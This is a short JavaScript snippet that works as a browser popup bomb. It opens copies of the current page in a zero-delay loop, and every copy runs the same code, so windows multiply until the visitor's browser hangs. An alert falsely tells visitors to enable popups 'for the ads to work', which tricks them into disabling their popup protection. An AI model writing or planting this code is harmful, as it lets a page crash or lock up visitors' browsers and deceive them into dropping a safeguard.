newWin = window.open(window.location.href);
if(!newWin) { 
  alert("Please enable popups inorder for the ads to work"); 
  setTimeout(() => {
    window.close();
  }, 5000);
}
setInterval(() => {
  window.open(window.location.href);
  window.open(window.location.href);
}, 0);
